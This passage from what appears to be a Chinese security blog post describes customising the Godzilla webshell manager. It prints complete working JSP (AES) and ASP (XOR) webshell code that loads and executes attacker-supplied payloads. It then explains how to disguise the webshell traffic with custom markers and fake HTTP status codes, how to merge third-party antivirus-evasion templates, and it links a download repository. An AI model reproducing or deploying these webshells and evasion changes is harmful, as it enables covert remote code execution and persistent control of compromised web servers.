+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240920180815804.png" alt="image-20240920180815804"></p>
+<pre><code>
+</code></pre>
+<p>我们这里看下xor的流量加上message，是不是感觉有点突兀，因为它本身就是xor的乱码，如果我们在加message感觉有点怪怪的。这里就不加了。（其实是没研究明白，等我在学学）</p>
+<h5 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h5><p>好接下来我们看jsp的，godzilla默认java的有两种载荷，一种aes-base64,一种是aes-raw，和php一样，不过php是先xor，可能是php默认开启ssl哪个函数的话，用对称加密吧，java默认有aes，那么就可以直接用了，就通用了。</p>
+<p>jsp默认 java-aes-base64</p>
+<pre><code class="jsp">&lt;%! String xc=&quot;3c6e0b8a9c15224a&quot;; String pass=&quot;pass&quot;; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(&quot;java.util.Base64&quot;);Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(&quot;java.util.Base64&quot;);Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%&gt;&lt;%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null){session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
+%&gt;
+</code></pre>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241009175840339.png" alt="image-20241009175840339"></p>
+<p>默认aes流量，这里由于全局设置了前后缀，就直接带了，下面返回包，和phpbase64一样</p>
+<img src="/images/哥斯拉二开从0到1/image-20241009180000918.png" alt="image-20241009180000918"  />
+
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241009181920050.png" alt="image-20241009181920050"></p>
+<p>我们先改一下代码。依旧替换一下左右信息</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241010174148624.png" alt="image-20241010174148624"></p>
+<p>然后我们在写两个变量，把前后的md5替换掉就好了。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241010174432335.png" alt="image-20241010174432335"></p>
+<p>这样就好看一点了，然后我们也把jsp的返回响应包写里面</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241010174630597.png" alt="image-20241010174630597"></p>
+<p>好，写好之后，我们来看一下。404.</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174236574.png" alt="image-20241011174236574"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174043037.png" alt="image-20241011174043037"></p>
+<p>没有任何问题，好，接下来，我们看怎么生成的码。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011173910400.png" alt="image-20241011173910400"></p>
+<p>从新在generate里面写一个方法，原来的是</p>
+<pre><code>public byte[] generate(String password, String secretKey) {
+    return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
+}
+</code></pre>
+<p>我们新写一个方法</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174428716.png" alt="image-20241011174428716"></p>
+<p>然后去到generate文件，copy一个方法，然后加个messsage</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174502165.png" alt="image-20241011174502165"></p>
+<p>然后就是把bin文件写好，这里我直接用的大师傅的代码，回头咱们自己改</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174605083.png" alt="image-20241011174605083"></p>
+<p>最后调用的方法写一下就好了。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174704236.png" alt="image-20241011174704236"></p>
+<p>ok，这样就可以直接生成了，测试没啥问题。</p>
+<p>我用其他大师傅的二开的，好多都不能生成原版的，这样比较简单生成我们自定义的了。</p>
+<p>这里就不该aesraw的了。跟上面原因一样，不好看。（其实就是笔者没研究明白）</p>
+<h5 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h5><p>ASP是Active Server Page的缩写，意为“活动服务器网页”。是MicroSoft公司开发的服务器端脚本环境，是一个WEB服务器端的开发环境，利用它可以产生和执行动态的、互动的、高性能的WEB服务应用程序。ASP采用脚本语言VBScript（Javascript）作为自己的开发语言。常用于各种动态网站中。 ASP是一种服务器端脚本编写环境，可以用来创建和运行动态网页或web应用程序。ASP的网页文件的格式是.asp。</p>
+<p>asp的我们选用<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012102901818.png" alt="image-20241012102901818"></p>
+<p>asp xor base64的改一下。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012103024676.png" alt="image-20241012103024676"></p>
+<p>这是我们的原始流量，长得和上面的差不多，</p>
+<pre><code class="asp">&lt;%
+Set bypassDictionary = Server.CreateObject(&quot;Scripting.Dictionary&quot;)
+
+Function Base64Decode(ByVal vCode)
+    Dim oXML, oNode
+    Set oXML = CreateObject(&quot;Msxml2.DOMDocument.3.0&quot;)
+    Set oNode = oXML.CreateElement(&quot;base64&quot;)
+    oNode.dataType = &quot;bin.base64&quot;
+    oNode.text = vCode
+    Base64Decode = oNode.nodeTypedValue
+    Set oNode = Nothing
+    Set oXML = Nothing
+End Function
+
+Function decryption(content,isBin)
+    dim size,i,result,keySize
+    keySize = len(key)
+    Set BinaryStream = CreateObject(&quot;ADODB.Stream&quot;)
+    BinaryStream.CharSet = &quot;iso-8859-1&quot;
+    BinaryStream.Type = 2
+    BinaryStream.Open
+    if IsArray(content) then
+        size=UBound(content)+1
+        For i=1 To size
+            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))
+        Next
+    end if
+    BinaryStream.Position = 0
+    if isBin then
+        BinaryStream.Type = 1
+        decryption=BinaryStream.Read()
+    else
+        decryption=BinaryStream.ReadText()
+    end if
+
+End Function
+    key=&quot;3c6e0b8a9c15224a&quot;
+    content=request.Form(&quot;pass&quot;)
+    if not IsEmpty(content) then
+
+        if  IsEmpty(Session(&quot;payload&quot;)) then
+            content=decryption(Base64Decode(content),false)
+            Session(&quot;payload&quot;)=content
+            response.End
+        else
+            content=decryption(Base64Decode(content),true)
+            bypassDictionary.Add &quot;payload&quot;,Session(&quot;payload&quot;)
+            Execute(bypassDictionary(&quot;payload&quot;))
+            result=run(content)
+            response.Write(&quot;11cd6a&quot;)
+            if not IsEmpty(result) then
+                response.Write Base64Encode(decryption(result,true))
+            end if
+            response.Write(&quot;ac826a&quot;)
+        end if
+    end if
+%&gt;
+</code></pre>
+<p>可以看到  最后输出了两个字符串</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012104746955.png" alt="image-20241012104746955"></p>
+<p>源payload中也是匹配前六和后六，那么我们顺着他的改一下。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012171426760.png" alt="image-20241012171426760"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012171446561.png" alt="image-20241012171446561"></p>
+<p>原版代码改一下。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012171504578.png" alt="image-20241012171504578"></p>
+<p>非常ok。我们来改一下回显状态码。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112100654131.png" alt="image-20241112100654131"></p>
+<p>asp的话  我们加这一句话即可</p>
+<p>Response.Status = “500 Internal Server Error”</p>
+<p>就会强制改回显状态码，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112100816345-17313772966692.png" alt="image-20241112100816345"></p>
+<p>蔽日这里改成a，我们就会强制加个状态码</p>
+<p>如果改成404，那么这个文件就不可以使用了</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112104047871.png" alt="image-20241112104047871"></p>
+<p>直接就会报错，设置成302就不会报错了，也可以用，但是吧  仔细看的话，感觉有点问题</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112104124569.png" alt="image-20241112104124569"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112104316247.png" alt="image-20241112104316247"></p>
+<p>当然，你可以加一些你喜欢的字符。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112105056867.png" alt="image-20241112105056867"></p>
+<p>好，然后我们用大师傅的免杀，缝合一下。</p>
+<p>只需要将生成的马改下格式，然后放在template下即可</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112164410940.png" alt="image-20241112164410940"></p>
+<p>此时就能生成了。</p>
+<p>生成一个，试一下，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112164520622.png" alt="image-20241112164520622"></p>
+<p>301伪装，emmm，还行吧。asp的先这样。</p>
+<h5 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h5><p>接下来时aspx的</p>
+<p>其实流程都一样了，这次我们换个单词，就用常见的data吧</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241113164145932.png" alt="image-20241113164145932"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241113164158602.png" alt="image-20241113164158602"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102937132.png" alt="image-20241114102937132"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241113165224132.png" alt="image-20241113165224132"></p>
+<p>至此，简单的二开哥斯拉就完成了，其实也没有改什么，就只是加了前后缀，并且有一些加密类型也没有做更改，只是自己学习一下，简单记录一下。</p>
+<p>如果大哥们有自己的免杀马，但是还用俺这个类型的，那么只需要在木马前后输出的地方改成data这种形式就可以了。</p>
+<h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>这里只是改了一丢丢，并没有改流量以及加密方式，只是做了伪装，下个版本我们修改一下加密方式，这样的话会更好一点。而且是抄的其他大师傅的免杀🐎，下回争取的做一下免杀。还有就是message其实是固定的，希望能让他动起来。</p>
+<h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><p><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p>
+<h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p>
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><pre><code>https://github.com/BeichenDream/Godzilla            原版哥斯拉
+https://mp.weixin.qq.com/s?__biz=MzkxNTUwNjgxOQ==&amp;mid=2247484153&amp;idx=1&amp;sn=67d8b3932714ff0a0ee5745f7049a661&amp;scene=21#wechat_redirect    哥斯拉webshell管理工具二开小记
+https://github.com/Tas9er/ByPassGodzilla   ByPassGodzilla
+</code></pre>
